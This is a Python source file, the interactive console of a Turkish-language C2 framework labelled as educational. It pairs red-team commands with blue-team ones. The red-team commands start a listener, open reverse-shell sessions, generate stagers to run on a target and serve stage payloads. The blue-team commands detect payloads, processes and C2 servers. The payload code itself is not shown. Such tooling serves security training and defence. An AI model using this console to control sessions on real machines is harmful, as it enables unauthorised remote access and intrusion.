#!/usr/bin/env python3
"""
ERSIN - Eğitim Amaçlı C2 Framework
E: Endpoint | R: Reconnaissance | S: Stage | I: Injector | N: Node

Ana giriş noktası: İnteraktif konsol arayüzü
"""

import sys
import os
import argparse
import threading
import signal
import json

# Proje kök dizinini path'e ekle
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from shared.config import BANNER, Colors, VERSION, log_event
from server.c2_server import C2Server
from stager.generator import StagerGenerator, StageServer
from defender.defender import (
    PayloadDetector, ProcessKiller, PortManager,
    NetworkSniffer, C2ServerDetector, AutoDefender,
)


class ErsinConsole:
    """ERSIN İnteraktif Konsol Arayüzü."""

    def __init__(self):
        self.c2_server: C2Server = None
        self.stage_server: StageServer = None
        self.stager_gen = StagerGenerator()
        self.defender = AutoDefender()
        self.running = True

        # Ctrl+C yakalama
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):
        print()
        print(Colors.warning("Ctrl+C yakalandı"))
        if self.c2_server:
            self.c2_server.stop()
        if self.stage_server:
            self.stage_server.stop()
        self.running = False

    def start(self):
        """İnteraktif konsolu başlat."""
        print(BANNER)
        self._print_help()

        while self.running:
            try:
                cmd = input(
                    f"\n{Colors.RED}{Colors.BOLD}ERSIN{Colors.RESET}"
                    f"{Colors.DIM}>{Colors.RESET} "
                ).strip()

                if not cmd:
                    continue

                self._handle_command(cmd)

            except (KeyboardInterrupt, EOFError):
                print()
                self._cmd_exit()
                break

    def _handle_command(self, cmd: str):
        """Komut yönlendirme."""
        parts = cmd.split()
        command = parts[0].lower()
        args = parts[1:]

        commands = {
            # === Red Team ===
            "listen": self._cmd_listen,
            "stop": self._cmd_stop,
            "sessions": self._cmd_sessions,
            "interact": self._cmd_interact,
            "kill": self._cmd_kill,
            "generate": self._cmd_generate,
            "stager": self._cmd_stager_server,

            # === Blue Team ===
            "scan": self._cmd_scan,
            "detect": self._cmd_detect,
            "sniff": self._cmd_sniff,
            "c2scan": self._cmd_c2scan,
            "closeport": self._cmd_closeport,
            "ports": self._cmd_ports,
            "defend": self._cmd_defend,
            "killpid": self._cmd_killpid,
            "killport": self._cmd_killport,

            # === Genel ===
            "help": lambda a: self._print_help(),
            "clear": lambda a: os.system("clear" if os.name != "nt" else "cls"),
            "exit": lambda a: self._cmd_exit(),
            "quit": lambda a: self._cmd_exit(),
            "status": self._cmd_status,
        }

        handler = commands.get(command)
        if handler:
            try:
                handler(args)
            except Exception as e:
                print(Colors.error(f"Komut hatası: {e}"))
                log_event("ERROR", f"Komut hatası: {command}", {"error": str(e)})
                # Hata durumunda portları kapat
                self._error_cleanup()
        else:
            print(Colors.error(f"Bilinmeyen komut: {command}"))
            print(Colors.info("Yardım için 'help' yazın"))

    # =========================================================
    # RED TEAM Komutları
    # =========================================================

    def _cmd_listen(self, args):
        """C2 sunucusu başlat."""
        host = args[0] if len(args) > 0 else "127.0.0.1"
        port = int(args[1]) if len(args) > 1 else 4444

        if self.c2_server and self.c2_server.running:
            print(Colors.warning("C2 sunucusu zaten çalışıyor!"))
            return

        self.c2_server = C2Server(host, port)
        # Stager'a anahtar bilgisi ver
        self.stager_gen.c2_host = host
        self.stager_gen.c2_port = port

        thread = threading.Thread(target=self.c2_server.start, daemon=True)
        thread.start()

    def _cmd_stop(self, args):
        """C2 sunucusunu durdur."""
        if self.c2_server:
            self.c2_server.stop()
            self.c2_server = None
            print(Colors.success("C2 sunucusu durduruldu"))
        else:
            print(Colors.warning("Çalışan sunucu yok"))

        if self.stage_server:
            self.stage_server.stop()
            self.stage_server = None

    def _cmd_sessions(self, args):
        """Oturumları listele."""
        if not self.c2_server:
            print(Colors.warning("C2 sunucusu çalışmıyor"))
            return
        self.c2_server.list_sessions()

    def _cmd_interact(self, args):
        """Bir oturumla etkileşim."""
        if not args:
            print(Colors.error("Kullanım: interact <session_id>"))
            return
        if not self.c2_server:
            print(Colors.warning("C2 sunucusu çalışmıyor"))
            return
        self.c2_server.interact(int(args[0]))

    def _cmd_kill(self, args):
        """Bir oturumu sonlandır."""
        if not args:
            print(Colors.error("Kullanım: kill <session_id>"))
            return
        if not self.c2_server:
            print(Colors.warning("C2 sunucusu çalışmıyor"))
            return
        self.c2_server.kill_session(int(args[0]))

    def _cmd_generate(self, args):
        """Payload oluştur. Kullanım: generate [host] [c2port] [stagerport]"""
        # Host ve port argümanları
        host = args[0] if len(args) > 0 else self.stager_gen.c2_host
        try:
            port = int(args[1]) if len(args) > 1 else self.stager_gen.c2_port
            stager_port = int(args[2]) if len(args) > 2 else self.stager_gen.stager_port
        except ValueError:
            print(Colors.error(
                "Port sayı olmalı! Kullanım: generate [host] [c2port] [stagerport]"
            ))
            return

        for name, value in (("C2", port), ("Stager", stager_port)):
            if not 1 <= value <= 65535:
                print(Colors.error(f"{name} portu 1-65535 aralığında olmalı: {value}"))
                return

        if port == stager_port:
            print(Colors.error(
                f"C2 portu ile stager portu aynı olamaz: {port}. "
                "İki sunucu aynı portu kullanamaz."
            ))
            return

        # Eğer C2 sunucusu çalışıyorsa onun ayarlarını al
        if self.c2_server and self.c2_server.running:
            host = self.c2_server.host
            port = self.c2_server.port
            print(Colors.info(f"C2 sunucusu çalışıyor, onun ayarları kullanılıyor: {host}:{port}"))

        # Eğer stage sunucusu çalışıyorsa onun portunu kullan
        if self.stage_server and self.stage_server.running:
            stager_port = self.stage_server.port
            print(Colors.info(
                f"Stage sunucusu çalışıyor, stager portu ondan alınıyor: {stager_port}"
            ))

        # Stager generator'ı güncelle
        self.stager_gen.c2_host = host
        self.stager_gen.c2_port = port
        self.stager_gen.stager_port = stager_port

        print(Colors.info(f"Payload oluşturuluyor → C2: {host}:{port} | Stager: {host}:{stager_port}"))
        print()

        result = self.stager_gen.generate_all()

        print(Colors.success(f"Stage payload: {result['stage']}"))
        print(Colors.success(f"Stager:        {result['stager']}"))
        print()
        print(Colors.info(f"Hedef C2:     {host}:{port}"))
        print(Colors.info(f"Stager portu: {host}:{stager_port}"))
        print()
        print(Colors.info("Kullanım:"))
        print(f"  1. C2 sunucu başlat:       {Colors.YELLOW}listen {host} {port}{Colors.RESET}")
        print(f"  2. Hedefte stager çalıştır: python3 {result['stager']}")
        print(f"     (stager önce stage'i {stager_port} portundan indirir)")
        print(f"  3. Stager sunucusu başlat: {Colors.YELLOW}stager {host} {stager_port}{Colors.RESET}")

    def _cmd_stager_server(self, args):
        """Stage dağıtım sunucusu başlat. Kullanım: stager [host] [stagerport]"""
        import glob
        stage_files = sorted(glob.glob(os.path.join("stages", "stage_*.py")))

        if not stage_files:
            print(Colors.error("Stage dosyası bulunamadı! Önce 'generate' çalıştırın."))
            return

        latest_stage = stage_files[-1]
        host = args[0] if len(args) > 0 else self.stager_gen.c2_host
        try:
            port = int(args[1]) if len(args) > 1 else self.stager_gen.stager_port
        except ValueError:
            print(Colors.error("Port sayı olmalı! Kullanım: stager [host] [stagerport]"))
            return

        if not 1 <= port <= 65535:
            print(Colors.error(f"Port 1-65535 aralığında olmalı: {port}"))
            return

        if self.stage_server and self.stage_server.running:
            print(Colors.warning(
                f"Stage sunucusu zaten çalışıyor: "
                f"{self.stage_server.host}:{self.stage_server.port}"
            ))
            return

        # Oluşturulan son stager hangi portu bekliyor? Uyuşmazsa stager bağlanamaz.
        payload_port = self._last_stager_payload_port()
        if payload_port is not None and payload_port != port:
            print(Colors.warning(
                f"Son stager payload'ı {payload_port} portunu kullanıyor, "
                f"sunucu {port} portunda dinleyecek. "
                f"Eşleşmesi için 'generate {host} {self.stager_gen.c2_port} {port}' çalıştırın."
            ))

        # Sonraki 'generate' çağrıları aynı portu kullansın
        self.stager_gen.stager_port = port

        self.stage_server = StageServer(host, port, latest_stage)
        thread = threading.Thread(target=self.stage_server.start, daemon=True)
        thread.start()

    @staticmethod
    def _last_stager_payload_port():
        """En son üretilen stager payload'ının gömülü STAGER_PORT değerini oku."""
        import glob
        import re

        stager_files = sorted(glob.glob(os.path.join("stages", "stager_*.py")))
        if not stager_files:
            return None

        try:
            with open(stager_files[-1], "r", encoding="utf-8") as f:
                match = re.search(r"^STAGER_PORT\s*=\s*(\d+)", f.read(), re.MULTILINE)
        except OSError:
            return None

        return int(match.group(1)) if match else None

    # =========================================================
    # BLUE TEAM Komutları
    # =========================================================

    def _cmd_scan(self, args):
        """Tam sistem taraması."""
        detector = PayloadDetector()
        result = detector.full_scan()

        # Sonuçları kaydet
        log_event("SCAN", "Tam tarama tamamlandı", result)

    def _cmd_detect(self, args):
        """Şüpheli process tespiti."""
        detector = PayloadDetector()
        threats = detector.scan_processes()

        if threats:
            print(Colors.error(f"\n{len(threats)} şüpheli process tespit edildi:"))
            for t in threats:
                print(f"  PID: {t['pid']} | {t['name']} | {t['pattern']}")
                print(f"    {Colors.DIM}{t['cmdline']}{Colors.RESET}")
        else:
            print(Colors.success("Şüpheli process tespit edilmedi ✓"))

    def _cmd_sniff(self, args):
        """Ağ trafiği dinle."""
        port = int(args[0]) if args else None
        duration = int(args[1]) if len(args) > 1 else 60

        sniffer = NetworkSniffer(port=port)
        sniffer.start_capture(duration=duration)

    def _cmd_c2scan(self, args):
        """C2 sunucu tespiti."""
        host = args[0] if args else "127.0.0.1"
        ports = [int(p) for p in args[1:]] if len(args) > 1 else None

        results = C2ServerDetector.scan_for_c2_servers(host, ports)

        c2_found = [r for r in results if r["is_c2"]]
        if c2_found:
            print(Colors.error(f"\n{len(c2_found)} C2 sunucusu tespit edildi!"))
        else:
            print(Colors.success("\nC2 sunucusu tespit edilmedi ✓"))

    def _cmd_closeport(self, args):
        """Port kapat."""
        if not args:
            print(Colors.error("Kullanım: closeport <port>"))
            return
        PortManager.close_port(int(args[0]))

    def _cmd_ports(self, args):
        """Dinleme yapan portları listele."""
        ports = PortManager.list_listening_ports()

        if not ports:
            print(Colors.info("Dinleme yapan port bulunamadı"))
            return

        print(f"\n{Colors.BOLD}{'Port':<8} {'IP':<18} {'PID':<8} {'Process':<20} {'Durum'}{Colors.RESET}")
        print(f"{'─'*70}")
        for p in ports:
            marker = Colors.colorize(" ⚠", Colors.RED) if p["suspicious"] else ""
            print(
                f"{p['port']:<8} {p['ip']:<18} "
                f"{p['pid'] or '?':<8} {p['process']:<20}"
                f"{marker}"
            )
        print()

    def _cmd_defend(self, args):
        """Otomatik savunma sistemi."""
        auto_kill = "--auto-kill" in args or "-k" in args
        interval = 5

        for i, a in enumerate(args):
            if a in ("--interval", "-i") and i + 1 < len(args):
                interval = int(args[i + 1])

        defender = AutoDefender(auto_kill=auto_kill)
        defender.start(interval=interval)

    def _cmd_killpid(self, args):
        """Process ID'ye göre sonlandır."""
        if not args:
            print(Colors.error("Kullanım: killpid <pid>"))
            return
        ProcessKiller.kill_process(int(args[0]))

    def _cmd_killport(self, args):
        """Port üzerindeki tüm process'leri sonlandır."""
        if not args:
            print(Colors.error("Kullanım: killport <port>"))
            return
        ProcessKiller.kill_by_port(int(args[0]))

    # =========================================================
    # Genel Komutlar
    # =========================================================

    def _cmd_status(self, args):
        """Sistem durumu."""
        print(f"\n{Colors.BOLD}{'='*50}{Colors.RESET}")
        print(f"{Colors.BOLD}  ERSIN Sistem Durumu{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*50}{Colors.RESET}")

        # C2 sunucu durumu
        if self.c2_server and self.c2_server.running:
            sessions = len(self.c2_server.sessions)
            print(Colors.success(
                f"C2 Sunucu: {self.c2_server.host}:{self.c2_server.port} "
                f"({sessions} oturum)"
            ))
        else:
            print(Colors.warning("C2 Sunucu: Kapalı"))

        # Stage sunucu durumu
        if self.stage_server and self.stage_server.running:
            print(Colors.success(
                f"Stage Sunucu: {self.stage_server.host}:{self.stage_server.port}"
            ))
        else:
            print(Colors.warning("Stage Sunucu: Kapalı"))

        print(f"{Colors.BOLD}{'='*50}{Colors.RESET}\n")

    def _cmd_exit(self):
        """Çıkış."""
        print(Colors.warning("ERSIN kapatılıyor..."))

        if self.c2_server:
            self.c2_server.stop()
        if self.stage_server:
            self.stage_server.stop()

        self.running = False
        print(Colors.success("Güle güle! 👋"))

    def _error_cleanup(self):
        """Hata durumunda temizlik yap ve portları kapat."""
        print(Colors.warning("Hata temizliği yapılıyor..."))

        if self.c2_server and self.c2_server.running:
            try:
                self.c2_server.stop()
            except Exception:
                pass

        if self.stage_server and self.stage_server.running:
            try:
                self.stage_server.stop()
            except Exception:
                pass

        log_event("ERROR", "Hata temizliği yapıldı")

    def _print_help(self):
        """Yardım menüsü."""
        print(f"""
{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║                    ERSIN KOMUT MENÜSÜ                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  {Colors.RED}▸ RED TEAM (Saldırı){Colors.RESET}{Colors.BOLD}                                        ║
║    listen [host] [c2port]   C2 sunucusu başlat (def: 4444)   ║
║    stop                   C2 sunucusunu durdur               ║
║    sessions               Aktif oturumları listele           ║
║    interact <id>          Oturumla etkileşim (reverse shell) ║
║    kill <id>              Oturumu sonlandır                  ║
║    generate [host] [c2port] [stagerport] Payload üret        ║
║      c2port: C2 portu (def 4444), stagerport: stage (8080)   ║
║    stager [host] [stagerport] Stage dağıtım sunucusu başlat  ║
║                                                              ║
║  {Colors.BLUE}▸ BLUE TEAM (Savunma){Colors.RESET}{Colors.BOLD}                                       ║
║    scan                   Tam sistem taraması                ║
║    detect                 Şüpheli process tespiti            ║
║    sniff [port] [süre]    Ağ trafiği dinle (Wireshark-lite)  ║
║    c2scan [host] [port..] C2 sunucu tespiti                  ║
║    ports                  Dinleme yapan portları listele     ║
║    closeport <port>       Belirli portu kapat                ║
║    killpid <pid>          Process sonlandır                  ║
║    killport <port>        Port üzerindeki process'leri öldür ║
║    defend [-k] [-i N]     Otomatik savunma sistemi           ║
║                                                              ║
║  {Colors.GREEN}▸ GENEL{Colors.RESET}{Colors.BOLD}                                                     ║
║    status                 Sistem durumu                      ║
║    clear                  Ekranı temizle                     ║
║    help                   Bu menüyü göster                   ║
║    exit                   Çıkış                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def main():
    parser = argparse.ArgumentParser(
        description="ERSIN - Eğitim Amaçlı C2 Framework",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"ERSIN v{VERSION}")
    parser.add_argument(
        "--quick-listen", "-ql",
        metavar="PORT",
        type=int,
        help="Hızlı dinleme modu (direkt C2 başlat)",
    )
    parser.add_argument(
        "--quick-scan", "-qs",
        action="store_true",
        help="Hızlı tarama modu (direkt sistem taraması)",
    )
    parser.add_argument(
        "--quick-defend", "-qd",
        action="store_true",
        help="Hızlı savunma modu (otomatik defender)",
    )
    parser.add_argument(
        "--auto-kill",
        action="store_true",
        help="Savunma modunda otomatik sonlandırma",
    )

    args = parser.parse_args()

    if args.quick_scan:
        print(BANNER)
        detector = PayloadDetector()
        detector.full_scan()
        return

    if args.quick_defend:
        print(BANNER)
        defender = AutoDefender(auto_kill=args.auto_kill)
        try:
            defender.start()
        except KeyboardInterrupt:
            pass
        return

    # İnteraktif mod
    console = ErsinConsole()

    if args.quick_listen:
        console.c2_server = C2Server("0.0.0.0", args.quick_listen)
        thread = threading.Thread(target=console.c2_server.start, daemon=True)
        thread.start()
        import time
        time.sleep(0.5)

    console.start()


if __name__ == "__main__":
    main()
